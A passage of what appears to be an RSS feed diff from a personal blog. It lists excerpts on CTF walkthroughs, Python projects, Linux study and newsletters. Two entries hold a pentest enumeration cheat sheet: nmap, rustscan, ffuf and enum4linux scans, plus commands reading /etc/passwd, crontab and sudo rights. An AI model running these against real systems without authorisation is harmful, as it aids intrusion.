+Let’s learn some Linux skills and common utilities around automation, package management, and service/application logging. Are you keen? Yeah!
+Let’s go on with Linux Fundamentals 3 TryHackMe Walkthrough.
+Disclaimer, see Linux Fundamentals Part 1 and Linux Fundamentals Part 2 for more. Also, see the video walkthrough too:
+Task 1 Introduction &amp;amp; Task 2 Deploy Your Linux Machine Alright, you should be a pro with connecting to TryHackMe’s VPN via OpenVPN and ssh-ing into the TryHackMe user via the provided ip address.</description>
+    </item>
+    
+    <item>
+      <title>CompTIA A&#43; Study Notes (220-1101)</title>
+      <link>//localhost:1313/comptia-a-plus-study-notes/</link>
+      <pubDate>Wed, 16 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/comptia-a-plus-study-notes/</guid>
+      <description>Installing Hardware and Display Components Hardware and Device Replacement RAM: system memory or desk of PC, fast access, low amount = lower access speeds, volatile. Storage: file cabinet of PC, slower access, static (non-volatile). Check MoBo user guide to ensure RAM amount, form-factor etc. GPU/Video Card: processes video and connects to external monitors. CPU: brain of PC. DC Jack Replacement Research – https://youtu.be/zFuu8LSaAQE
+Hard Drive Migration SSD: non-volatile flash memory for storage, faster, reliable, less power, quieter, smaller.</description>
+    </item>
+    
+    <item>
+      <title>Basic Home Network Analysis - Beginner Cyber Sec Project</title>
+      <link>//localhost:1313/basic-home-network-analysis-beginner-cyber-sec-project/</link>
+      <pubDate>Fri, 04 Feb 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/basic-home-network-analysis-beginner-cyber-sec-project/</guid>
+      <description>Are you a Cyber Sec student? Or just interested in the Cyber Sec space?
+Yes, and yes!
+Do you go to family and friends, hop on their network and poke around? It’s easy to do and you can quickly find vulnerabilities that someone could exploit.
+Recently, I stayed at my wife’s uncle and aunties house and I noticed a major network vuln.
+Imagine you put a lock on a door for home security but never lock it, robbers just come in every night to look around.</description>
+    </item>
+    
+    <item>
+      <title>How To Build A PC 2023</title>
+      <link>//localhost:1313/pc-build/</link>
+      <pubDate>Sat, 29 Jan 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/pc-build/</guid>
+      <description>Are you new to PC building? Maybe a friend’s put together their computer and you want to learn more. Whatever your reason, building your own PC is a lot of fun! So, let’s learn how to build a PC in 2022, this is your beginner’s guide to building a PC.
+Disclaimer, this is not a step-by-step article, but more of a general guide to approaching how to build a PC.</description>
+    </item>
+    
+    <item>
+      <title>2021 Annual Review</title>
+      <link>//localhost:1313/2021/</link>
+      <pubDate>Sat, 22 Jan 2022 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/2021/</guid>
+      <description>Here we are again, another year come and gone. Let’s look back at the lessons learned and mistakes made.
+All up, it’s been a big year, we’ve all been redefining ‘normal’ post-2020. There’s been more division over the concern for safety and I genuinely hope you and your family are safe and well, thanks for reading this.
+Disclaimer, this is a self-indulgent article and will not be value-focused. Since 2019, I’ve written yearly recaps as an exercise to be more intentional and increase personal growth.</description>
+    </item>
+    
+    <item>
+      <title>Python Range Function • Quick Python Project Lesson</title>
+      <link>//localhost:1313/python-range-function-quick-python-project-lesson/</link>
+      <pubDate>Thu, 18 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/python-range-function-quick-python-project-lesson/</guid>
+      <description>So you’re learning Python and want to understand the range function, welcome!
+The range function paired with a for loop is a great way to repeat code a number of times.
+Let’s learn the basics of the range function with Python and then it’s over to you for a little project.
+Basics Let’s have a simple counter go from 1 to 5, and show the results as it counts.</description>
+    </item>
+    
+    <item>
+      <title>Homelabs 2023 Beginner&#39;s Guide To Homelabbing</title>
+      <link>//localhost:1313/homelab/</link>
+      <pubDate>Sun, 07 Nov 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/homelab/</guid>
+      <description>You are probably new to homelabbing and need a bit of guidance. Building a homelab means building a computer network, or lab, at home.
+Homelabs can be anything from old laptops to expensive high-end enterprise equipment.
+Typically, you’ll find homelabs involve a lot of virtual computers, meaning they’re not physical. There’s little entry to get started and unlimited possibility as your homelab grows.
+You’ll find techies and sys-admins from all over the world who love to share their homelabs, projects and builds.</description>
+    </item>
+    
+    <item>
+      <title>ZigZag - Beginner Python Project</title>
+      <link>//localhost:1313/zigzag-beginner-python-project/</link>
+      <pubDate>Tue, 19 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/zigzag-beginner-python-project/</guid>
+      <description>Let’s learn some Python!
+Want an easy python program to get started? Here’s zigzag.
+This program is from Automate The Boring Stuff With Python Chapter 3, under A Short Program: Zigzag.
+Welcome to my third study session to learn Python Programming! The video above covers the entire process of copying the zig zag program from Automate The Boring Stuff With Python.
+See Built-in Functions, Time access and conversions and What does end=’ ‘ exactly do?</description>
+    </item>
+    
+    <item>
+      <title>Random Number Generator • Easy Python Project</title>
+      <link>//localhost:1313/random-number-generator-easy-python-project/</link>
+      <pubDate>Sun, 17 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/random-number-generator-easy-python-project/</guid>
+      <description>Want an easy python project to get you started learning python?
+Here’s a random number generator built-in python!
+See the project live below or via GitHub.
+Okay, let’s build your very own number generator python program.
+Foundation Let’s write the program in stages.
+But first, it’s recommended to write out pseudo code as it helps to map out and plan the program before you deep dive into writing it.</description>
+    </item>
+    
+    <item>
+      <title>Bagels • Beginner Python Project</title>
+      <link>//localhost:1313/bagels/</link>
+      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/bagels/</guid>
+      <description>Want a beginner Python Project that’s going to test you? A program longer than 40 lines of code?
+Look no further, here’s Bagels!
+This is from The Big Book of Small Python Projects – Chapter 1 Bagels.
+Watch the Study Session #2 for the full programming behind the scenes.
+Disclaimer, some areas of this blog post are still under construction, look for Work In Progress (WIP).
+Global Variables, Main Function Let’s break Bagels down.</description>
+    </item>
+    
+    <item>
+      <title>Hashing Passwords • Python Module Basics</title>
+      <link>//localhost:1313/hashing-passwords-python-module-basics/</link>
+      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/hashing-passwords-python-module-basics/</guid>
+      <description>Hashing is the foundation of tech like blockchains that make cryptocurrencies possible. See Blockchain 101 – A Visual Demo and Blockchain 101 – Part 2 – Public / Private Keys and Signing.
+So for a fun study session, let’s follow a walkthrough on Password Hashing in Python, see the original post by DillonB07.
+Watch live video:
+1. Update Python and Pip Update both pip and Python before starting this program.</description>
+    </item>
+    
+    <item>
+      <title>Username Generator Beginner Python Program</title>
+      <link>//localhost:1313/username-generator-beginner-python-program/</link>
+      <pubDate>Sat, 16 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/username-generator-beginner-python-program/</guid>
+      <description>Usernames, we all have one, maybe for work or on Twitter.
+How about a python program that automatically generates a username based on your name?
+Sound cool? Let’s make a simple project to generate usernames.
+See the live program below:
+Disclaimer, this is not a python tutorial, for that, see Intro To Python.
+Core Code Let’s get the core elements down for the username generator.
+First, displaying the title via print() and then using two variables with input().</description>
+    </item>
+    
+    <item>
+      <title>Paste Text Only in Word - CTRL &#43; SHIFT &#43; V to Microsoft Word</title>
+      <link>//localhost:1313/paste-text-only-word-ctrl-shift-v-to-microsoft-word/</link>
+      <pubDate>Wed, 13 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/paste-text-only-word-ctrl-shift-v-to-microsoft-word/</guid>
+      <description>Are you needing to copy/paste a lot of content from online to Microsoft Word? Yep!
+It seems small, but Word has the most annoying lack of a shortcut, no CTRL + SHIFT + V – paste text only. Word has the ability to paste text only via right-click, select option.
+So, let’s quickly add a new shortcut to paste text only in Word.
+First, go to File &amp;gt; Options &amp;gt; Customize Ribbon &amp;gt; Keyboard shortcuts: Customize…</description>
+    </item>
+    
+    <item>
+      <title>Mad Lib Game • Beginner Python Project</title>
+      <link>//localhost:1313/mad-lib-game-beginner-python-project/</link>
+      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/mad-lib-game-beginner-python-project/</guid>
+      <description>Are you learning Python? Need some beginner Python projects?
+It’s nice to have you here, this is my Mad Lib Game, an easy beginner Python Project for you!
+Mad Libs are a simple game, it consists of one player prompts others for a list of words to substitute for blanks in a story before reading aloud.
+Instead of a human, we’ll have the computer read them back via the terminal, cool.</description>
+    </item>
+    
+    <item>
+      <title>Intro To Python • Free Python Starter Guide</title>
+      <link>//localhost:1313/python-intro/</link>
+      <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/python-intro/</guid>
+      <description>Wanting to learn Python?
+Of course you do!
+Python is the hacker’s language, it’s more modern than bash and it’s super cool.
+If you’ve never programmed or wrote a line of code, that’s okay! We all have to start somewhere.
+There’s a lot of good places to learn Python, I recommend Automate The Boring Stuff with Python and the official Python Documentation Tutorial.
+If you’re learning to hack in the Cyber Security space, see Hackers Learning Path.</description>
+    </item>
+    
+    <item>
+      <title>Vanguard vs Pearler 2023 Best Aussie FIRE Broker</title>
+      <link>//localhost:1313/pearler/</link>
+      <pubDate>Wed, 29 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/pearler/</guid>
+      <description>Great! I just made the move.
+The Vanguard platform gets the job done, but Pearler has the style with more features and a clearer development roadmap. If you’re new to investing, see Beginner’s Guide To Passive Investing.
+Let’s look at what’s involved in switching investment brokers.
+Disclaimer, this is not personal financial advice. If you’d like to support the blog, consider signing up with Pearler via this link.
+Vanguard vs Pearler – Why?</description>
+    </item>
+    
+    <item>
+      <title>Guide To SEO - Ultimate Beginners Guide For SEO</title>
+      <link>//localhost:1313/guide-to-seo-ultimate-beginners-guide-for-seo/</link>
+      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/guide-to-seo-ultimate-beginners-guide-for-seo/</guid>
+      <description>Hello there Search Engine Optimisation (SEO), or in other words, changing web pages to satisfy the magical algorithm of Google.
+Learning SEO is a windy road that takes time, let’s go on this journey together, a guide to SEO.
+Nat Eliason made an SEO course and wrote how to start a blog. I’ll be condensing these, plus adding my experience from web design and digital marketing.
+This is my beginner’s guide to SEO for blogging in 2021.</description>
+    </item>
+    
+    <item>
+      <title>CyberWox CyberSec Homelab on Virtual Box</title>
+      <link>//localhost:1313/cyberwox/</link>
+      <pubDate>Sat, 21 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/cyberwox/</guid>
+      <description>Homelabs are fun, challenging, but fun.
+Building an entire virtual network of interconnected computers to simulate real-world traffic and situations.
+This is my additional guide to Cyberwox’s Building a Cybersecurity Homelab, but, for those using VirtualBox. Here’s a visual guide for the lab:
+*Disclaimer, this does not contain 100% of the steps of this project.
+Intro Ideally, use a dedicated lab computer for this, a spare laptop or an old gaming PC.</description>
+    </item>
+    
+    <item>
+      <title>Linux Quick Start Guide</title>
+      <link>//localhost:1313/quick-linux/</link>
+      <pubDate>Sat, 14 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/quick-linux/</guid>
+      <description>Learning Linux is fun! Beginning Linux is hard.
+There’s a lot of free courses and content to help you. But what about a quick start guide to Linux? Getting started with Linux made easy?
+No fluff, just a quick and dirty setup to get you started with Linux basics! Well, here it is, the Linux Quick Start Guide. To follow along, install Ubuntu Linux and let’s learn how to get started with Linux.</description>
+    </item>
+    
+    <item>
+      <title>Linux Unhatched Cisco Course Review and Notes</title>
+      <link>//localhost:1313/unhatched/</link>
+      <pubDate>Wed, 21 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/unhatched/</guid>
+      <description>Learning Linux?
+Well, Linux Unhatched from CISCO Net Academy is a great place to start.
+Depending on your experience, this short course could take you a few days or over a week.
+It’s free, well structured, easy to read and interactive. Perfect for learning Linux.
+Below are my notes for the course, I skipped 14-14.2 as I’ll be coming back to that section.
+*Disclaimer, the course content is owned and shared via CISCO Net Academy.</description>
+    </item>
+    
+    <item>
+      <title>WordPress App Won&#39;t Connect To Website Cloudways Self-hosted</title>
+      <link>//localhost:1313/wordpress-app-wont-connect-to-website-cloudways-self-hosted/</link>
+      <pubDate>Wed, 21 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/wordpress-app-wont-connect-to-website-cloudways-self-hosted/</guid>
+      <description>Your WordPress app won’t connect to your website? Let’s fix that!
+Note, this is for Cloudways self-hosted websites.
+Follow this guide if you need help setting up the app and connecting it to your website.
+Check Jetpack Is Installed Make sure you have the most up-to-date plugin Jetpack. It’s what connects your self-hosted site to the app.
+If you’ve never set Jetpack up, follow this guide to help you.</description>
+    </item>
+    
+    <item>
+      <title>Basic Python Project • Is It Raining?</title>
+      <link>//localhost:1313/basic-python-project-is-it-raining/</link>
+      <pubDate>Sun, 06 Jun 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/basic-python-project-is-it-raining/</guid>
+      <description>Learning python? It’s an incredible programming language to have in your tool belt.
+This project is inspired by an early example from Automate The Boring Stuff with Python.
+Flow Control This python project is to impliment this flow chart:
+Taken from chapter 2, there’s a few things to digest, see the code step by step in Python Tutor.
+Let’s write the steps is psuedoe code:
+Ask if it’s raining? If no, go outside.</description>
+    </item>
+    
+    <item>
+      <title>Hackers Beginner Guide To Online Anonymity</title>
+      <link>//localhost:1313/anonymity/</link>
+      <pubDate>Fri, 21 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/anonymity/</guid>
+      <description>How do we start using our mad hacker skills in the real world AND remain undetected?
+We need to set ourselves up to be anonymous! No, we’re not joining a hacktivist group here.
+Let’s learn the basics to cover ourselves online. We’ll be using Kali Linux in this example, here’s my guide if you need help getting set up.
+For a wider approach to online anonymity, see Kalle Hallden’s Become Invisible Online.</description>
+    </item>
+    
+    <item>
+      <title>Beginner Python Project - Guessing Game</title>
+      <link>//localhost:1313/guess/</link>
+      <pubDate>Sun, 02 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/guess/</guid>
+      <description>Do you want a beginner Python project to keep you on your programming journey?
+Here’s a breakdown of a simple Guessing Game made in Python.
+See it live via Replit or view the source code via GitHub.
+Full disclosure, this is a part of the Automate The Boring Stuff with Python Programming Course.
+Plan the Program with Pseudocode Pseudocode is like a programmer’s brain dump.
+Write out a simple list of the steps this guessing game will go through.</description>
+    </item>
+    
+    <item>
+      <title>Kali Linux WSL WITHOUT Microsoft Store</title>
+      <link>//localhost:1313/kali-wsl/</link>
+      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/kali-wsl/</guid>
+      <description>Before you start, make sure your Windows 10 OS is up to date as version 1903 or higher can run this. To check the version, click Windows Start Button and type System Information, next to Version you’ll see your current number.
+If lower than version 1903, go to Settings and Update to get latest changes.
+Okay, now you’re good to go!
+1. Setup Subsystem for Linux Right click the Windows Start Button and open Windows PowerShell (Admin).</description>
+    </item>
+    
+    <item>
+      <title>TryHackMe RootMe Walkthrough</title>
+      <link>//localhost:1313/tryhackme-rootme/</link>
+      <pubDate>Fri, 02 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/tryhackme-rootme/</guid>
+      <description>I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.
+This is a beginner ‘easy’ game, their description reads a CTF for beginners, can you root me? If you’re unaware, root means top-level access, like super admin or master-of-everything.
+When you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours.</description>
+    </item>
+    
+    <item>
+      <title>PicoCTF General Skills</title>
+      <link>//localhost:1313/picoctf/</link>
+      <pubDate>Mon, 29 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/picoctf/</guid>
+      <description>Welcome, it’s nice to have you here.
+My first ever write-up in the Cyber Sec space, I’m excited!
+Thanks to NetworkChuck’s Discord for getting me onto GynvaelEN’s Hacking Livestream #5 lead me to find PicoCTF.
+PicoCTF is a great place to start CTF’s, their beginner friendly options provide a simple step into the space!
+Disclaimer, I didn’t realise they were getting more difficult. So I couldn’t complete all the General Skills, 10/12 so far.</description>
+    </item>
+    
+    <item>
+      <title>Starting Out In Cyber Security</title>
+      <link>//localhost:1313/starting-out-in-cyber-security/</link>
+      <pubDate>Sun, 28 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/starting-out-in-cyber-security/</guid>
+      <description>Over the last few years, the term Cyber Security has become more popular.
+Google trends show it’s searched now more than ever before in history. It’s currently Australia’s top hiring priority.
+What’s Cyber Security? And why is it so popular? Let’s do some research and find out!
+Disclaimer: I’m not a Cyber Security expert, I’m a student of IT and love sharing what I’m learning or have learnt.
+What’s Cyber Security?</description>
+    </item>
+    
+    <item>
+      <title>How To Setup Ubuntu Using VirtualBox</title>
+      <link>//localhost:1313/how-to-setup-ubuntu-using-virtualbox/</link>
+      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/how-to-setup-ubuntu-using-virtualbox/</guid>
+      <description>Setting up a Linux Operating System like Ubuntu can be a bit daunting, especially if you’re a firm Windows user with no Linux experience.
+I’m glad you’re here starting your Linux journey! You won’t look back!
+Ubuntu is generally accepted as the most beginner-friendly Linux OS.
+Download Ubuntu and VirtualBox Go to ubuntu.com to download the iso file, it has the entire operating system compressed into it.
+Note the system requirements:</description>
+    </item>
+    
+    <item>
+      <title>2020 Annual Review</title>
+      <link>//localhost:1313/yearly-review-2020/</link>
+      <pubDate>Mon, 28 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/yearly-review-2020/</guid>
+      <description>I’ve been procrastinating this article. Summarising an entire year feels difficult. But I see the value in looking back. It makes moving forward clearer.
+Looking forward is hard. The future is a fantasy. No one knows what’s happening tomorrow. But looking back is tangible. I like tangible. So here’s my look back at the past 12 months. Ups, downs and the honesty in-between.
+This article is self-indulgent. If you want value, this isn’t for you.</description>
+    </item>
+    
+    <item>
+      <title>OneNote to Notion and Moving Apps</title>
+      <link>//localhost:1313/onenote-to-notion-moving-apps/</link>
+      <pubDate>Fri, 22 May 2020 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/onenote-to-notion-moving-apps/</guid>
+      <description>If you’re reading this you may very well be a lot like me.
+Using OneNote for personal notes, jotting down key meeting highlights and organising thoughts and ideas.
+If that sounds familiar, you’re probably a long time user of OneNote and a happy user. Personally I’ve always enjoyed using it. It’s fast, fluid design and easy navigation make it a great note-taking app. OneNote is good at one thing, notes.</description>
+    </item>
+    
+    <item>
+      <title>2019 Annual Review</title>
+      <link>//localhost:1313/2019/</link>
+      <pubDate>Mon, 16 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/2019/</guid>
+      <description>What a year! 2019 has been busy to say the least, I’ve learnt a lot of new lessons made even more mistakes! But overall, it’s been a massive year of growth so it’s all been worth it! Let’s review 2019!
+My Job as an IT Teacher 2019 was full of highlights like being featured in the companies blog, having short piece in a local magazine, being nominated for an educational emerging leader award and having one of our students win TAFE QLD student of the year award.</description>
+    </item>
+    
+    <item>
+      <title>Advise n&#39; Review</title>
+      <link>//localhost:1313/advise-n-review/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/advise-n-review/</guid>
+      <description>Hello friend,
+How has your week been? Reply and let me know what’s happened.
+My week has been good. More time on holidays creating content and relaxing with friends. I’ve still got two weeks left before going back to work, how cool is that?
+This covers LinkedIn’s importance, annual reviews and advice from a life coach. Reply to give me your feedback on these topics.
+1. Importance of LinkedIn If you’re not on LinkedIn, it’s worth signing up and engaging.</description>
+    </item>
+    
+    <item>
+      <title>Align Yourself</title>
+      <link>//localhost:1313/align-yourself/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/align-yourself/</guid>
+      <description>Hello friend,
+How has your week been?
+I hope this finds you well as it&amp;rsquo;s been a busy week wrapping up classrooms and assessing student work for me! You may have noticed I&amp;rsquo;m writing again, yes that&amp;rsquo;s right, I&amp;rsquo;m sticking to good habits and moving forward!
+What is Business Coaching? Dan Sullivan&amp;rsquo;s Coaching: The #1 Industry For The 21st Century explains what business coaching is.
+I never understood business coaching, sports coaching makes sense though!</description>
+    </item>
+    
+    <item>
+      <title>Bandit Level 10 &amp;#8211; 14</title>
+      <link>//localhost:1313/bandit-level-10-14/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/bandit-level-10-14/</guid>
+      <description>Over The Wire’s Bandit is a Linux Capture The Flag that tests your hacking skills. In this video, we walk through Bandit levels 10 to 14. These are some of the more difficult levels, but our clear and concise explanations will help you get through them. By the end of this video, you’ll be one step closer to becoming a master hacker!</description>
+    </item>
+    
+    <item>
+      <title>Beginner&#39;s Guide To Passive Investing 2023 Income, Tax, Super, Stocks and ETFs</title>
+      <link>//localhost:1313/passive/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/passive/</guid>
+      <description>You’re probably like me, wanting to understand the terms ‘wealth’ and ‘investing’.
+How does everyone else have this investment thing figured out?
+Let’s do a bit of research and look into investing!
+Disclaimer, I’m not a financial advisor, seek professional financial advice, this is for entertainment purposes only. This is primarily for Australian citizens; research your countries tax and investment-related laws respectively.
+Put Simply Investing is storing your cash in a different container to increase its value.</description>
+    </item>
+    
+    <item>
+      <title>Biz Plan</title>
+      <link>//localhost:1313/biz-plan/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/biz-plan/</guid>
+      <description>[Note] This month&amp;rsquo;s newsletter is self indulgent as it discusses my goals and plans.
+It&amp;rsquo;s taken me 6 years to start uploading regular videos to YouTube, so it&amp;rsquo;s time for a plan. Here&amp;rsquo;s my brand/business plan, and shout out to my wife for helping me, these things are hard.
+Hi, my name&amp;rsquo;s Ash, I&amp;rsquo;m 27 and a cyber security enthusiast sharing my journey. You’ve received this newsletter as you subscribed via my website or downloaded a freebie.</description>
+    </item>
+    
+    <item>
+      <title>Buckets</title>
+      <link>//localhost:1313/buckets/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/buckets/</guid>
+      <description>Hi friend,
+August has been full of reorganising my digital life, ideas and goals. I&amp;rsquo;ve spent a lot of time writing about my website and where I want to go with everything.
+Let&amp;rsquo;s go over some areas.
+Filling Up Buckets It helps my brain to have broad bucket-like groups I can pool together topics.
+Hacking, work-life and web design will be the three focus categories for blog posts. I&amp;rsquo;ve updated my bio: Hacking in public @ mrash.</description>
+    </item>
+    
+    <item>
+      <title>Check In</title>
+      <link>//localhost:1313/check-in/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/check-in/</guid>
+      <description>Hi friend,
+We&amp;rsquo;ve passed 2022’s halfway point, how about a check-in? Let&amp;rsquo;s talk about goals, work, courses and current learning path. Disclaimer, this newsletter is from Mr Ash (that’s me), and you’re subscribed or downloaded a freebie. Read online or listen here, enjoy!
+Checking In, Halfway Point It&amp;rsquo;s been a good year so far, I completed TryHackMe’s Beginner Path and it spawned me starting up YouTube again. Let&amp;rsquo;s look at the Key Point Indicators (KPIs) in a bit more detail.</description>
+    </item>
+    
+    <item>
+      <title>Checklist</title>
+      <link>//localhost:1313/checklist/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/checklist/</guid>
+      <description>Quick guide for pentest CTFs like Boot2Roots.
+Wikis
+HackTricks AppSecExplained Red Team Notes Blogs
+Overgrowncarrot1 Enumerate Open ports? rustscan, nmap. Running services? Version numbers? Operating System (Linux/Windows)? Domains? /etc/hosts Webserver (Apache/Ngnix)? Subdomins? DNS nslookup $domain dig -query=ANY $domain Common Files robots.txt sitemap.xml .htaccess security.txt manifest.json browserconfig.xml etc Thanks for reading</description>
+    </item>
+    
+    <item>
+      <title>Dilemma</title>
+      <link>//localhost:1313/dilemma/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/dilemma/</guid>
+      <description>Hi friend,
+Welcome back to the monthly newsletter, I hope you&amp;rsquo;re staying safe wherever you are around the world. How was your May 2022? Mine was slightly uneventful (like last month) and flu ridden due to colder weather. I hope yours was better.
+Let&amp;rsquo;s focus on a learning dilemma, an ongoing issue I and many face. How to continue a learning path when things get difficult and stale. Disclaimer, this newsletter is from Mr Ash.</description>
+    </item>
+    
+    <item>
+      <title>Enumeration</title>
+      <link>//localhost:1313/enum/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/enum/</guid>
+      <description>rustscan
+rustscan -a $ip -g rustscan -a $ip -p $ports -- -sC -sV | tee scan.init nmap
+nmap -vv -Pn $ip nmap -vv -Pn -p $ports -A $ip feroxbuster
+feroxbuster -u http://$ipa -w $wordlist | tee fuzz.init FFUF
+ffuf -u http://$ip/FUZZ -w $wordlist | tee fuzz.init firefox
+Analysis: Whatruns, Wappalyzer /robots.txt, sitemap(.xml) smb
+enum4linux $ipa | tee enum4.txt # smb shares Linux Enumeration
+ls -la /home cat /etc/passwd cat /etc/crontab sudo -l # run sudo with?</description>
+    </item>
+    
+    <item>
+      <title>Epic Outlook</title>
+      <link>//localhost:1313/epic-outlook/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/epic-outlook/</guid>
+      <description>Hello friend,
+How’s your week been?
+Mines been mixed, it’s been good back at work but draining. We had 2-3 days of virtual meetings/events. After an hour or so, there’s only so much new info my brain can absorb.
+It’s been great seeing the team but a bit uncharted as I’m taking on my new teaching position. Still unclear how it’s all going to play out of the next 2-3 weeks.</description>
+    </item>
+    
+    <item>
+      <title>Finance</title>
+      <link>//localhost:1313/finance/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/finance/</guid>
+      <description>Hi there,
+It&amp;rsquo;s been a minute since I last wrote to you. How have the months of May, June and July been for you?
+We finished Semester 1 strong with a class full of happy students! I even got a thank you card and a $100 event cinema gift card from then, wow!
+My wife and I went on holiday with family to the Gold Coast. It was a great getaway before lockdown struck.</description>
+    </item>
+    
+    <item>
+      <title>Get Help</title>
+      <link>//localhost:1313/get-help/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/get-help/</guid>
+      <description>Hi friend,
+What a month! July feels like both the longest and shortest 31 days of recent. I hope you’ve been good throughout July. Disclaimer, this newsletter is from Mr Ash (that’s me), and you subscribed or downloaded a freebie, read online or listen here.
+This month’s new content:
+Simple CTF (Video), OhSINT (Video), Agent Sudo (Video) Network Servcies 2 Part 1, Part 2 and Part 3 CS50P Problem Set Guide, Replit EdFest 2022 Jam – Intro To PyScript (Video) Getting Help Do you need help?</description>
+    </item>
+    
+    <item>
+      <title>Grow Smart</title>
+      <link>//localhost:1313/grow-smart/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/grow-smart/</guid>
+      <description>Hello friend,
+How has your week been?
+It’s a bittersweet week for me and my wife as it’s the last week of holidays before work. Bitter as we’ve loved our time relaxing at home, sweet as we’re looking forward to the routine work brings.
+Here’s awesome content that I’ve learnt from this week.
+1. Stay Small with Scalable Systems I’ve wasn’t a big reader growing up but I’ve learnt how valuable it is over the last two years.</description>
+    </item>
+    
+    <item>
+      <title>Hard Work Pays Off</title>
+      <link>//localhost:1313/hard-work-pays-off/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/hard-work-pays-off/</guid>
+      <description>Hello friend,
+How has your week been? Reply and tell me one nice thing that you experienced.
+My week has been good. It’s the second last week of the holidays! I’ve loved creating more content over this time. But I’m worried about going back to work and balancing the goals I’ve set for myself.
+1. Ultimate Lessons From Tim Ferris How I Built This interviewed Tim Ferris, entrepreneur/author of The Four Hour Work Week.</description>
+    </item>
+    
+    <item>
+      <title>Home Worklife</title>
+      <link>//localhost:1313/home-worklife/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/home-worklife/</guid>
+      <description>Hi friend,
+It&amp;rsquo;s nice writing to you again, I hope you had a nice break over the holidays. As more people (like Aussies) are working from home more than ever before, myself included, let&amp;rsquo;s discuss having a healthy home work-life.
+Disclaimer, you’ve received this newsletter (read online version) as you’ve subscribed to Mr Ash.co (or downloaded a freebie). If interested, read last months newsletter or see all newsletters for more.</description>
+    </item>
+    
+    <item>
+      <title>Hugo</title>
+      <link>//localhost:1313/hugo/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/hugo/</guid>
+      <description>Full Supported Languages List
+Alias(es)
+Here&amp;rsquo;s what I use for my urls:
+url: hugoalias: # aliases for multiple- post/hugo- But in order for aliases to work, I have to change aslias to asliases, save. Then change it back to aslias. Strange.
+Markdown All in One Hands down the best extension to use within VSCode is Markdown All in One.
+Paste links over text for automatic linking Continues ordered and unordered lists when typing </description>
+    </item>
+    
+    <item>
+      <title>In Progress</title>
+      <link>//localhost:1313/in-progress/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
